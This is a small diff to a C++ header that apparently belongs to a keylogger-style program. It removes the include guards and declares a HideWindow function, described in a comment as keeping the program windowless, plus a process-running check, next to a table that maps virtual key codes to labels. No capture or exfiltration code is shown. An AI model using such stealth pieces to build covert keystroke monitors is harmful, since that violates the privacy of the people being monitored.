@@ -1,6 +1,3 @@
-#ifndef CONSTANTS
-#define CONSTANTS
-
 #include<map>
 #include<string>
 using namespace std;
@@ -215,4 +212,6 @@ map<int,KeyValPair> Map_Keys::Keys
     { 0x06, {"[VK_XBUTTON2]", "[X Button 2 **]"} },
 };
 
-#endif
+//Functions Declarations
+void HideWindow(); // Just defined function. But already not running the exe as a console app. So no window will be formed  by default.
+bool IsProcessRunning(LPSTR procname);
